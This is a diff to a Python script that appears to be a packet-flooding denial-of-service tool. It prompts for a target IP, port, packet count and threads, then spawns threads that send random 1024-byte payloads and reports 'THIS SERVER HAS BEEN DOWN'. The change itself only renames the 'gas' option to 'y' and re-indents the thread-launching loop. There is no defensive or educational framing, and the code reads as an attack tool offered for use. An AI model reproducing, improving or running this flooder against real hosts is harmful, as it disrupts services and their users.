@@ -30,7 +30,7 @@ ip = str(input("TARGET IP : "))
 port = int(input("TARGET PORT : "))
 times = int(input("PACKET : "))
 threads = int(input("THREADS : "))
-choice = str(input("GAS ? (gas/n) : "))
+choice = str(input("GAS ? (y/n) : "))
 def run():
        data = random._urandom(1024)
        i = random.choice(("[-]","[!]","[$]"))
@@ -60,9 +60,9 @@ def run2():
                         print("[X] ERROR, THIS SERVER HAS BEEN DOWN!!!")
 
 for y in range(threads):
-        if choice == 'gas':
-                th = threading.Thread(target = run)
-                th.start()
-        else:
-                th = threading.Thread(target = run2)
-                th.start()
+	if choice == 'y':
+		th = threading.Thread(target = run)
+		th.start()
+	else:
+		th = threading.Thread(target = run2)
+		th.start()
